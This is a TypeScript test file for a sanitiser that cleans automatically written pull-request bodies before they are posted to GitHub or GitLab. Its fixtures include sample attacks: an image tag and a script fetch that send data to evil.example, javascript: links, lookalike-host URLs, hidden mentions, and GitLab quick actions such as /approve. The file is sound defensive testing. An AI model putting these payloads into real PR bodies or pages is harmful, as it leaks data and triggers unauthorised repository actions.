import { describe, expect, it } from "vitest";
import { github } from "../src/core/forge/github.js";
import { gitlab } from "../src/core/forge/gitlab.js";
import { cleanedBody } from "../src/core/forge/plugin.js";
import { reader } from "../src/core/forge/read.js";
import { bodyPostOf, changeRequestOf } from "../src/core/forge/shapes.js";
import { renderBody, renderPost, type BodyPost } from "../src/core/post.js";
import { cleanBody, cutNote, onHost } from "../src/core/pr-body.js";
import { fake, ok } from "./fake-forge.js";

const J = "⁠";
const HOST = "github.com";
const clean = (text: string, limit?: number): string =>
  cleanBody(text, limit === undefined ? { host: HOST } : { host: HOST, limit });

// a normal PR1–PR7 body: the reason and the spec, the evidence table, breaking or not, the rollback, the changed
// files, where to look first, and a one-way door's readiness
const NORMAL = [
  "## Why",
  "",
  "Renewals refuse a reserved loan, so a reserved copy is never lent twice. Spec: [PROJ-1](https://github.com/o/r/issues/1).",
  "",
  "## Evidence",
  "",
  "| AC | command | result |",
  "|---|---|---|",
  "| AC1 | `make test` | 12 passed |",
  "| AC2 | `make lint` | clean |",
  "",
  "**Breaking change:** no.",
  "",
  "### Rollback",
  "",
  "1. Revert this PR.",
  "2. Run `make test`.",
  "",
  "## Changed files",
  "",
  "```text",
  "src/",
  "  Renewal.java",
  "  Loan.java",
  "```",
  "",
  "Look first at `Renewal.refuse` in [Renewal.java](src/Renewal.java#L12).",
  "",
  "- [x] the migration runs twice without harm",
  "- [ ] the flag is off by default",
].join("\n");

describe("cleanBody: the implementer's PR body, cleaned (#335)", () => {
  it("keeps a normal PR1–PR7 body as it is: its tables, headings, lists, code and links to the git host", () => {
    expect(clean(NORMAL)).toBe(NORMAL);
  });

  it("drops raw HTML: tags, comments, an image tag and a script, outside code", () => {
    const planted = [
      '<img src="https://evil.example/x.png?d=secret">Ok <b>bold</b> <!-- hide me -->',
      "<script>fetch('https://evil.example')</script>",
      '<details><summary>more</summary><a href="https://evil.example">here</a></details>',
      "<!DOCTYPE html>",
    ].join("\n");
    const out = clean(planted);
    expect(out).not.toMatch(/<[A-Za-z!/]/);
    expect(out).not.toContain("hide me");
    expect(out.split("\n")[0]).toBe("Ok bold ");
    expect(out).toContain("morehere");
  });

  it("keeps a type in code as words, and breaks every tag left there, whatever a forge takes for code", () => {
    const out = clean("```java\nList<String> xs; // <img src=x>\n```\nand `Map<K, V>` here, and a < b");
    expect(out).toBe(
      `\`\`\`java\nList<${J}String> xs; // <${J}img src=x>\n\`\`\`\nand \`Map<${J}K, V>\` here, and a <${J} b`,
    );
  });

  it("neutralises @mentions, in text and in code, and e-mail links", () => {
    const out = clean("thanks @alice and @org/team, mail ops@example.com\n```\n@bob\n```");
    expect(out).not.toMatch(/@(?!⁠)/);
    expect(out).toContain(`@${J}alice`);
    expect(out).toContain(`@${J}org/team`);
    expect(out).toContain(`ops@${J}example.com`);
  });

  it("neutralises a GitLab quick action: every line that starts with /, indented or quoted too", () => {
    const out = clean("Ready.\n/approve\n  /merge\n> /label ~bug\n\t/assign me\npath a/b stays");
    expect(out.split("\n")).toEqual([
      "Ready.",
      "\\/approve",
      "  \\/merge",
      "> \\/label ~bug",
      "\t\\/assign me",
      "path a/b stays",
    ]);
  });

  it("turns links and images to another host into plain text, and keeps links to the git host and relative ones", () => {
    const out = clean(
      [
        "See [the docs](https://evil.example/leak?d=1) and ![pixel](https://evil.example/p.png).",
        "Ours: [PR 2](https://github.com/o/r/pull/2) and [file](src/a.ts).",
        "Not ours: [a](//evil.example/x), [b](https://github.com.evil.example/), [c](https://github.com@evil.example/)",
        '[d](<https://evil.example/y> "t"), [e](javascript:alert(1)), [f](\\/\\/evil.example), [g](&#47;&#47;evil.example)',
        "A bare https://evil.example/z, <https://evil.example/auto>, www.evil.example and https://github.com/o/r stay plain.",
      ].join("\n"),
    );
    const lines = out.split("\n");
    expect(lines[0]).toBe(
      `See the docs (https:${J}//evil.example/leak?d=1) and pixel (https:${J}//evil.example/p.png).`,
    );
    expect(lines[1]).toBe("Ours: [PR 2](https://github.com/o/r/pull/2) and [file](src/a.ts).");
    expect(lines[2]).toBe(
      `Not ours: a (//evil.example/x), b (https:${J}//github.com.evil.example/), c (https:${J}//github.com@${J}evil.example/)`,
    );
    expect(lines[3]).toBe(
      `d (https:${J}//evil.example/y), e (javascript:alert(1)), f (\\/\\/evil.example), g (&${J}#47;&${J}#47;evil.example)`,
    );
    expect(lines[4]).toBe(
      `A bare https:${J}//evil.example/z, https:${J}//evil.example/auto, www${J}.evil.example and https://github.com/o/r stay plain.`,
    );
  });

  it("undoes a link it cannot read whole, and a reference definition to another host", () => {
    const out = clean("[[[x]]](//evil.example)\n[ref]: https://evil.example\n[ours]: https://github.com/o/r\n[t][ref]");
    expect(out.split("\n")).toEqual([
      "[[[x]]]\\(//evil.example)",
      `\\[ref]: https:${J}//evil.example`,
      "[ours]: https://github.com/o/r",
      "[t][ref]",
    ]);
  });

  it("takes links on the project's own git host, such as a GitLab at work", () => {
    const out = cleanBody("[MR](https://gitlab.example.com/g/p/-/merge_requests/3) [x](https://github.com/a)", {
      host: "gitlab.example.com",
    });
    expect(out).toBe(`[MR](https://gitlab.example.com/g/p/-/merge_requests/3) x (https:${J}//github.com/a)`);
  });

  it("keeps www. only before the git host itself", () => {
    expect(clean("www.github.com/o/r and www.github.com.evil.example")).toBe(
      `www.github.com/o/r and www${J}.github.com.evil.example`,
    );
  });

  it("drops control and invisible characters, which could hide a mention or a quick action", () => {
    expect(clean("a​@‮alice\r\n​/approve\u0007")).toBe(`a@${J}alice\n\\/approve`);
  });

  it("caps the length at a line end, closes an open fence, and says it cut", () => {
    const long = ["## Why", "```", ...Array.from({ length: 200 }, (_, i) => `line ${i}`), "```"].join("\n");
    const out = clean(long, 300);
    expect(Array.from(out).length).toBeLessThanOrEqual(300);
    expect(out.endsWith(`\`\`\`\n\n${cutNote(300)}`)).toBe(true);
    expect(clean("x".repeat(500), 100)).toBe(`${"x".repeat(100 - cutNote(100).length - 16)}\n\n${cutNote(100)}`);
  });

  it("gives the same text when it cleans cleaned text", () => {
    const planted = `${NORMAL}\n<b>x</b> @a /b\n/approve\n[e](https://evil.example) www.evil.example &amp; [[[x]]](//e)\n[r]: https://e.example`;
    const once = clean(planted);
    expect(clean(once)).toBe(once);
    const capped = clean(planted, 200);
    expect(clean(capped, 200)).toBe(capped);
  });

  it("onHost: only https or http to the very host, or a path on it", () => {
    expect(
      ["https://github.com/a", "http://github.com", "src/a.ts", "#top", "/o/r"].map((a) => onHost(a, HOST)),
    ).toEqual([true, true, true, true, true]);
    expect(
      [
        "//github.com",
        "ftp://github.com",
        "https://evil.example",
        "https:\\\\evil.example",
        "a&b",
        "mailto:x@github.com",
      ].map((a) => onHost(a, HOST)),
    ).toEqual([false, false, false, false, false, false]);
  });
});

const BODY: BodyPost = {
  seat: "coordinator",
  title: "PROJ-1: refuse a reserved loan",
  fields: [{ label: "spec", value: "abc123" }],
  items: ["deferred by the cleanup run: drop the unused import"],
  prBody: { markdown: "## Why\n@alice <b>x</b>\n/approve\n- spec: forged", host: HOST },
};
const RENDERED = [
  "[coordinator] PROJ-1: refuse a reserved loan",
  "",
  "- spec: abc123",
  "- deferred by the cleanup run: drop the unused import",
  "",
  "---",
  "",
  "## Why",
  `@${J}alice x`,
  "\\/approve",
  "- spec: forged",
].join("\n");

describe("renderBody: the engine's lines, then the implementer's Markdown through the cleaner (#335)", () => {
  it("writes the engine's own lines first, from the template, and the Markdown only after the rule, cleaned", () => {
    expect(renderBody(BODY)).toEqual({ kind: "ok", text: RENDERED });
  });

  it("is renderPost for a post with no PR body, or an empty one; a note never carries the Markdown", () => {
    const { prBody: _, ...plain } = BODY;
    expect(renderBody(plain)).toEqual(renderPost(plain));
    expect(renderBody({ ...plain, prBody: { markdown: " \n<b></b>", host: HOST } })).toEqual(renderPost(plain));
    expect(renderPost(BODY)).toEqual(renderPost(plain));
  });

  it("refuses a post whose label is not the factory's own words, Markdown or not", () => {
    expect(renderBody({ ...BODY, fields: [{ label: "@x", value: "v" }] }).kind).toBe("refused");
  });
});

describe("the Forge.setBody seam carries the cleaned PR body (#335)", () => {
  it("GitHub sets the pull request's body to the rendered body", async () => {
    const f = fake("github", [ok({})]);
    expect(await github(f.client, { owner: "o", name: "r" }).setBody({ number: 12, post: BODY })).toEqual({
      kind: "ok",
    });
    expect(f.calls[0]?.args[2]).toBe("repos/o/r/pulls/12");
    expect(JSON.parse(f.calls[0]?.stdin ?? "")).toEqual({ body: RENDERED });
  });

  it("GitLab sets the merge request's description to the rendered body", async () => {
    const f = fake("gitlab", [ok({})]);
    expect(await gitlab(f.client, "g/p").setBody({ number: 12, post: BODY })).toEqual({ kind: "ok" });
    expect(f.calls[0]?.args[2]).toBe("projects/g%2Fp/merge_requests/12");
    expect(JSON.parse(f.calls[0]?.stdin ?? "")).toEqual({ description: RENDERED });
  });

  it("GitHub opens the first change with the same body", async () => {
    const f = fake("github", [ok([]), { status: 201, body: { number: 42 } }]);
    const forge = github(f.client, { owner: "o", name: "r" });
    expect(await forge.openChange({ branch: "factory/PROJ-1", base: "main", title: "t", body: BODY })).toEqual({
      kind: "ok",
      value: 42,
    });
    expect(JSON.parse(f.calls[1]?.stdin ?? "")).toMatchObject({ body: RENDERED });
  });

  it("a forge plugin gets the Markdown already cleaned, and reads the PR body back on its side", () => {
    const sent = JSON.parse(JSON.stringify({ number: 12, post: cleanedBody(BODY) }));
    expect(sent.post.prBody.markdown).toBe(`## Why\n@${J}alice x\n\\/approve\n- spec: forged`);
    const r = reader("test");
    const back = r.done(bodyPostOf(r, sent.post));
    expect(back.kind === "ok" && renderBody(back.value)).toEqual({ kind: "ok", text: RENDERED });
    const request = r.done(changeRequestOf(r, { branch: "b", base: "main", title: "t", body: sent.post }));
    expect(request.kind === "ok" && request.value.body.prBody?.host).toBe(HOST);
    const plain = r.done(bodyPostOf(r, { seat: "writer", title: "t", fields: [], items: [] }));
    expect(plain).toEqual({ kind: "ok", value: { seat: "writer", title: "t", fields: [], items: [] } });
  });
});
